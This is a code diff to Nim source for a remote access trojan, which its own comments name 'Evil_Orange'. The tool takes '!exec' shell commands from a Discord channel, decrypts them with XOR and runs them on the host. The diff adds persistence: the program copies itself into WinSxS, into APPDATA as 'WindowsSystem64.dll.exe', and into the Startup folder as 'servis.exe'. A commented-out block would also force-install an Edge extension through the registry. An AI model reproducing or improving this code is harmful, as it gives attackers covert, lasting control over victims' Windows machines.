@@ -1,5 +1,5 @@
 import std/[httpclient, json, os, osproc, strutils, base64]
-import persistence 
+import std/strformat 
 #Hi. Welcome to Evil_Orange. I hope the code will work. have a nice day and please support
 let BOT_TOKEN = getEnv("DISCORD_TOKEN", "HERE_TOKEN")
 let CHANNEL_ID = getEnv("DISCORD_CHANNEL", "HERE_CHANEL")
@@ -26,11 +26,89 @@ proc xorDecrypt(key: array[32, byte], b64data: string): string =
   return result
 
 
+proc installPersistence*(deployPath: string, index: int = 1) =
+  let baseDir = deployPath.parentDir
+
+#[ 1. Native Messaging Host Kaydı
+  let nmRegPath* = r"HKCU\Software\Microsoft\Edge\NativeMessagingHosts\com.launcher.agent"
+  var p1 = startProcess(
+    "reg.exe",
+    args = [
+      "add", nmRegPath,
+      "/ve", "/t", "REG_SZ",
+      "/d", baseDir & "\\host.json",
+      "/f"
+    ],
+    options = {poNoConsole, poUsePath}
+  )
+  discard p1.waitForExit()
+  p1.close()
+
+  # 2. Edge Zorunlu Eklenti Kaydı
+  let extRegPath = r"HKCU\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist"
+  let extID = "jfnphkdpdjgokfnchpnlaekcgchlnfln"
+  let xmlUrl = "file:///" & baseDir.replace("\\", "/") & "/update.xml"
+
+  var p2 = startProcess(
+    "reg.exe",
+    args = [
+      "add", extRegPath,
+      "/v", $index,
+      "/t", "REG_SZ",
+      "/d", extID & ";" & xmlUrl,
+      "/f"
+    ],
+    options = {poNoConsole, poUsePath}
+  )
+  discard p2.waitForExit()
+  p2.close()
+]#
+  # When did Windows start peeling oranges.... Privacy is good !
+
+
+
+
+
+proc peel*() =
+  let originBinaryLoc = getAppFilename()
+  let baseVaultDir = "C:\\Windows\\WinSxS"
+  let deployTargetPath = baseVaultDir / "WindowsOrangePeller.exe"
+  try:
+    copyFile(originBinaryLoc, deployTargetPath)
+    echo "good peel ", deployTargetPath
+  except OSError as e:
+    echo "a error ", e.msg
+
+proc peel2() =
+  let originBinary = getAppFilename()
+  let roamingPath = getEnv("APPDATA")
+  
+  # HATA DÜZELTİLDİ: originBinary yerine roamingPath kullanıldı
+  let deployTarget = roamingPath / "WindowsSystem64.dll.exe"
+
+  try:
+    # HATA DÜZELTİLDİ: copyFil -> copyFile
+    copyFile(originBinary, deployTarget)
+    echo "peel2 okey: ", deployTarget
+  except OSError as e:
+    echo "error (peel2): ", e.msg
+
+# 2. Yöntem: Başlangıç (Startup) klasörüne kopyalama
+proc copyToStartup() =
+  let originBinary = getAppFilename()
+  
+  # HATA DÜZELTİLDİ: 'user' değişkenine gerek kalmadan APPDATA üzerinden tam yol alındı
+  let startupPath = getEnv("APPDATA") / r"Microsoft\Windows\Start Menu\Programs\Startup\servis.exe"
+
+  try:
+    copyFile(originBinary, startupPath)
+    echo "Startuppp ", startupPath
+  except OSError as e:
+    echo "error 107: ", e.msg
+
 when isMainModule:
-  installPersistence()
-  peel()
-
-
+  peel2()
+  copyToStartup()
 
 
   # HERE İS DUCKİNG DİSCORD
@@ -71,6 +149,7 @@ proc poll_commands() =
           try:
             decrypted = xorDecrypt(VODKA_KEY, content)
           except:
+            echo "a error at xor decrypt !"
             decrypted = content
           if decrypted.startsWith("!exec ") and decrypted.len >= 7:  #
             let command = decrypted[6..^1]
@@ -80,6 +159,6 @@ proc poll_commands() =
     except Exception as e:
       echo "error 42 . HOW YOU CAN MAKE İT ? ", e.msg
       #rate limit
-    sleep(6000)
+    sleep(60000)
 when isMainModule:
   poll_commands()
